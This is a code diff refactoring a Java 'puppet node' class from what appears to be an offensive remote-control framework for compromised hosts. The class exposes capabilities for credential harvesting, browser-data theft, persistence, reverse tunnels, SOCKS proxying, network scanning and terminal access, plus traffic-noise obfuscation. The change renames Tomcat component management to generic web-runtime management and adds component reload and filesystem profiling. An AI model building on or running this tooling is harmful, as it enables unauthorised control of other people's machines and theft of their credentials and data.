@@ -11,7 +11,7 @@ import org.leo.core.net.layer.HeaderNoiseStrategy;
 import org.leo.core.puppet.AbstractPuppetNode;
 import org.leo.core.puppet.capability.BasicInfoCapable;
 import org.leo.core.puppet.capability.BrowserDataCapable;
-import org.leo.core.puppet.capability.CatalinaManageCapable;
+import org.leo.core.puppet.capability.WebRuntimeManageCapable;
 import org.leo.core.puppet.capability.ClipboardCapable;
 import org.leo.core.puppet.capability.ComponentInvokeCapable;
 import org.leo.core.puppet.capability.ComponentManageCapable;
@@ -58,7 +58,7 @@ import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
-public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapable, TerminalCapable, FileCapable, NetworkInfoCapable, DiskCapable, SqlCapable, ScriptCapable, ResourceCapable, ClipboardCapable, BrowserDataCapable, HttpSenderCapable, ProcessCapable, RegistryCapable, ScheduledTaskCapable, ServiceCapable, EventLogCapable, UserAccountCapable, FirewallCapable, NetworkConnectionCapable, NetworkShareCapable, InstalledSoftwareCapable, WifiProfileCapable, PersistenceCapable, DockerCapable, SuidCapabilityCapable, HttpProxyCapable, LocalForwardCapable, ReverseTunnelCapable, Socks5ProxyCapable, ScanCapable, ComponentInvokeCapable, ComponentManageCapable, CatalinaManageCapable, JavaPluginCapable, CredentialHarvestCapable, HostScopedCapable, LoadedComponentCacheCapable {
+public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapable, TerminalCapable, FileCapable, NetworkInfoCapable, DiskCapable, SqlCapable, ScriptCapable, ResourceCapable, ClipboardCapable, BrowserDataCapable, HttpSenderCapable, ProcessCapable, RegistryCapable, ScheduledTaskCapable, ServiceCapable, EventLogCapable, UserAccountCapable, FirewallCapable, NetworkConnectionCapable, NetworkShareCapable, InstalledSoftwareCapable, WifiProfileCapable, PersistenceCapable, DockerCapable, SuidCapabilityCapable, HttpProxyCapable, LocalForwardCapable, ReverseTunnelCapable, Socks5ProxyCapable, ScanCapable, ComponentInvokeCapable, ComponentManageCapable, WebRuntimeManageCapable, JavaPluginCapable, CredentialHarvestCapable, HostScopedCapable, LoadedComponentCacheCapable {
 
     private int maxReqCount;
 
@@ -80,7 +80,7 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
     TestConnService testConnService;
     ScanService scanService;
     ResourceService resourceService;
-    CatalinaManageService catalinaManageService;
+    WebRuntimeManageService webRuntimeManageService;
     ExecScriptService execScriptService;
     HttpRequestService httpRequestService;
     CredentialHarvestService credentialHarvestService;
@@ -153,7 +153,7 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
         testConnService=new TestConnService(communication,requestLayers,responseLayers);
         scanService=new ScanService(communication,requestLayers,responseLayers);
         resourceService=new ResourceService(communication,requestLayers,responseLayers);
-        catalinaManageService=new CatalinaManageService(communication,requestLayers,responseLayers);
+        webRuntimeManageService=new WebRuntimeManageService(communication,requestLayers,responseLayers);
         execScriptService=new ExecScriptService(communication,requestLayers,responseLayers);
         httpRequestService=new HttpRequestService(communication,requestLayers,responseLayers);
         credentialHarvestService=new CredentialHarvestService(communication,requestLayers,responseLayers);
@@ -180,7 +180,7 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
         serviceRegistry.replace(componentLoadRegistry,
                 basicInfoService, commandService, componentService, fileService,
                 sqlService, testConnService, scanService, resourceService,
-                catalinaManageService, execScriptService, httpRequestService,
+                webRuntimeManageService, execScriptService, httpRequestService,
                 credentialHarvestService, networkInfoService, httpSenderService,
                 processService, registryService, scheduledTaskService,
                 serviceManagerService, eventLogService, userAccountService,
@@ -397,18 +397,23 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
     }
 
     @Override
-    public void unloadComponent(String componentId) throws Exception {
+    public Map<String, Object> reloadComponent(String componentId) throws Exception {
+        return componentService.reloadComponent(componentId);
+    }
 
+    @Override
+    public void unloadComponent(String componentId) throws Exception {
+        componentLoadRegistry.invalidate(hostId, componentId);
+    }
+
+    @Override
+    public Map<String, Object> getFileSystemProfile() throws Exception {
+        return fileService.getFileSystemProfile();
     }
 
     @Override
     public Map<String, Object> getFileList(String path) throws Exception {
         return fileService.getFileList(path);
-    }
-
-    @Override
-    public Map<String, Object> getRootList() throws Exception {
-        return fileService.getRootList();
     }
 
     @Override
@@ -436,17 +441,9 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
         return fileService.deleteFile(path);
     }
 
-    public Map<String, Object> copyFile(String srcPath, String destPath) throws Exception {
-        return fileService.copyFile(srcPath, destPath);
-    }
-
     @Override
     public Map<String, Object> copyFile(String srcPath, String destPath, String conflictStrategy) throws Exception {
         return fileService.copyFile(srcPath, destPath, conflictStrategy);
-    }
-
-    public Map<String, Object> moveFile(String srcPath, String newPath) throws Exception {
-        return fileService.moveFile(srcPath, newPath);
     }
 
     @Override
@@ -519,38 +516,17 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
         return resourceService.getResource(resourcePath);
     }
     @Override
-    public Map<String, Object> getCatalinaInfo(String catalinaName, String webFramework) throws Exception {
-        return catalinaManageService.getCatalinaInfo(catalinaName, webFramework);
+    public Map<String, Object> inspectWebRuntime(String runtimeFamily, String runtimeVersion,
+                                                 String webFramework) throws Exception {
+        return webRuntimeManageService.inspect(runtimeFamily, runtimeVersion, webFramework);
     }
 
     @Override
-    public Map<String, Object> unloadCatalinaFilter(String catalinaName, String contextName, String filterName) throws Exception {
-        return catalinaManageService.unloadFilter(catalinaName, contextName, filterName);
-    }
-
-    @Override
-    public Map<String, Object> unloadCatalinaServlet(String catalinaName, String contextName, String servletPattern) throws Exception {
-        return catalinaManageService.unloadServlet(catalinaName, contextName, servletPattern);
-    }
-
-    @Override
-    public Map<String, Object> unloadCatalinaValve(String catalinaName, String valveId) throws Exception {
-        return catalinaManageService.unloadValve(catalinaName, valveId);
-    }
-
-    @Override
-    public Map<String, Object> unloadCatalinaListener(String catalinaName, String listenerId) throws Exception {
-        return catalinaManageService.unloadListener(catalinaName, listenerId);
-    }
-
-    @Override
-    public Map<String, Object> unloadSpringController(String webFramework, String mappingInfo) throws Exception {
-        return catalinaManageService.unloadController(webFramework, mappingInfo);
-    }
-
-    @Override
-    public Map<String, Object> unloadSpringInterceptor(String webFramework, String interceptorId) throws Exception {
-        return catalinaManageService.unloadInterceptor(webFramework, interceptorId);
+    public Map<String, Object> removeWebRuntimeComponent(String runtimeFamily, String runtimeVersion,
+                                                          String webFramework, String componentType,
+                                                          String contextName, String identifier) throws Exception {
+        return webRuntimeManageService.remove(runtimeFamily, runtimeVersion, webFramework,
+                componentType, contextName, identifier);
     }
 
     @Override
